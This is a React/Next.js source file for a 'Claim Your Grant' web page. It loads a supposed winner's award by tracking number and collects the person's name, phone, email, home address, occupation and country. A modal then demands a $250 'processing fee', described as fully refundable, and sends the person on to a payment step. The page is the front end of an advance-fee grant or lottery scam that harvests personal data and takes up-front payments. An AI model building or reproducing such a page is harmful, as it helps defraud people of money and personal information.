"use client";

import { useState, useEffect, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Link from "next/link";

interface WinnerData {
  name: string;
  amountWon: number;
  id: string;
  createdAt: string;
}

interface ClaimFormData {
  fullName: string;
  phoneNumber: string;
  email: string;
  houseAddress: string;
  occupation: string;
  country: string;
}

function ClaimPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const id = searchParams.get("id");
  
  const [winner, setWinner] = useState<WinnerData | null>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [error, setError] = useState("");
  
  const [formData, setFormData] = useState<ClaimFormData>({
    fullName: "",
    phoneNumber: "",
    email: "",
    houseAddress: "",
    occupation: "",
    country: "",
  });

  useEffect(() => {
    if (!id) {
      router.push("/");
      return;
    }

    const fetchWinner = async () => {
      try {
        setLoading(true);
        const res = await fetch(`/api/winners/${encodeURIComponent(id)}`);
        const data = await res.json();

        if (!res.ok) {
          // Don't set error during loading to prevent flash before redirect
          return;
        }
        
        // Check if claim is already completed (has claimInfo with payment confirmation)
        if (data.claimInfo && data.claimInfo.paymentConfirmedAt) {
          router.push(`/status?id=${id}`);
          return;
        }
        
        setWinner(data);
        
        // Pre-fill form if user has tempClaimInfo (filled form but not uploaded files)
        if (data.tempClaimInfo) {
          setFormData({
            fullName: data.tempClaimInfo.fullName,
            phoneNumber: data.tempClaimInfo.phoneNumber,
            email: data.tempClaimInfo.email,
            houseAddress: data.tempClaimInfo.houseAddress,
            occupation: data.tempClaimInfo.occupation,
            country: data.tempClaimInfo.country,
          });
        }
      } catch {
        setError("Failed to load winner information");
      } finally {
        setLoading(false);
      }
    }

    fetchWinner();
  }, [id, router]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    // Basic validation
    if (!formData.fullName || !formData.phoneNumber || !formData.email || 
        !formData.houseAddress || !formData.occupation || !formData.country) {
      setError("All fields are required");
      return;
    }

    setShowModal(true);
  };

  const handleConfirmSubmit = async () => {
    if (!id) {
      setError("Tracking number is required");
      setShowModal(false);
      return;
    }
    
    setSubmitting(true);
    
    try {
      const res = await fetch(`/api/winners/${encodeURIComponent(id)}/claim`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.error || "Failed to submit claim");
        setShowModal(false);
        return;
      }

      // Success - redirect to payment page
      router.push(`/payment?id=${id}`);
      
    } catch {
      setError("Failed to submit claim");
      setShowModal(false);
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-emerald-600 mx-auto mb-4"></div>
          <p className="text-slate-600">Loading...</p>
        </div>
      </div>
    );
  }

  if (error || !winner) {
    return (
      <div className="min-h-screen bg-slate-50">
        <main className="mx-auto max-w-2xl px-4 py-16">
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <p className="text-red-800">{error || "Winner information not found"}</p>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50">
      <main className="mx-auto max-w-2xl px-4 py-8">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-slate-800 mb-2">
            Claim Your Grant
          </h1>
          <p className="text-slate-600">
            Complete the form below to claim your grant of ${winner.amountWon.toLocaleString()}
          </p>
        </div>

        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6 mb-6">
          <h2 className="text-lg font-semibold text-slate-800 mb-4">Grant Information</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <span className="text-sm text-slate-500">Tracking Number:</span>
              <p className="font-mono text-slate-800">{winner.id}</p>
            </div>
            <div>
              <span className="text-sm text-slate-500">Amount:</span>
              <p className="text-2xl font-bold text-emerald-600">${winner.amountWon.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
          <h2 className="text-lg font-semibold text-slate-800 mb-6">Personal Information</h2>
          
          <div className="space-y-6">
            <div>
              <label htmlFor="fullName" className="block text-sm font-medium text-slate-700 mb-2">
                Full Name *
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="Enter your full legal name"
              />
            </div>

            <div>
              <label htmlFor="phoneNumber" className="block text-sm font-medium text-slate-700 mb-2">
                Phone Number *
              </label>
              <input
                type="tel"
                id="phoneNumber"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="+1 (555) 123-4567"
              />
            </div>

            <div>
              <label htmlFor="email" className="block text-sm font-medium text-slate-700 mb-2">
                Email Address *
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="your.email@example.com"
              />
            </div>

            <div>
              <label htmlFor="houseAddress" className="block text-sm font-medium text-slate-700 mb-2">
                House Address *
              </label>
              <textarea
                id="houseAddress"
                name="houseAddress"
                value={formData.houseAddress}
                onChange={handleInputChange}
                required
                rows={3}
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="123 Main Street, Apt 4B, City, State 12345"
              />
            </div>

            <div>
              <label htmlFor="occupation" className="block text-sm font-medium text-slate-700 mb-2">
                Occupation *
              </label>
              <input
                type="text"
                id="occupation"
                name="occupation"
                value={formData.occupation}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="Software Engineer, Teacher, etc."
              />
            </div>

            <div>
              <label htmlFor="country" className="block text-sm font-medium text-slate-700 mb-2">
                Country *
              </label>
              <input
                type="text"
                id="country"
                name="country"
                value={formData.country}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none"
                placeholder="United States"
              />
            </div>
          </div>

          {error && (
            <div className="mt-6 bg-red-50 border border-red-200 rounded-lg p-4">
              <p className="text-red-800">{error}</p>
            </div>
          )}

          <div className="mt-8">
            <button
              type="submit"
              className="w-full px-6 py-3 bg-emerald-600 text-white font-medium rounded-lg hover:bg-emerald-700 transition-colors"
            >
              Proceed
            </button>
          </div>
        </form>
      </main>

      {/* Confirmation Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl shadow-xl max-w-md w-full p-6">
            <h3 className="text-xl font-semibold text-slate-800 mb-4">
              Processing Fee Required
            </h3>
            <p className="text-slate-600 mb-6">
              Before we can process your ${winner?.amountWon?.toLocaleString() || '0'} grant claim, a one-time processing fee of $250 is required to cover administrative costs, verification, and fund transfer processing.
            </p>
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-6">
              <p className="text-sm text-amber-800">
                <strong>Note:</strong> This fee is  fully refundable and will not be deducted from your grant amount.
              </p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={handleConfirmSubmit}
                disabled={submitting}
                className="flex-1 px-4 py-3 bg-emerald-600 text-white font-medium rounded-lg hover:bg-emerald-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {submitting ? "Processing..." : "Proceed to Pay Registration Fee"}
              </button>
              <button
                onClick={() => setShowModal(false)}
                className="flex-1 px-4 py-3 bg-slate-200 text-slate-800 font-medium rounded-lg hover:bg-slate-300 transition-colors"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function ClaimPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-emerald-600 mx-auto mb-4"></div>
          <p className="text-slate-600">Loading...</p>
        </div>
      </div>
    }>
      <ClaimPageContent />
    </Suspense>
  );
}
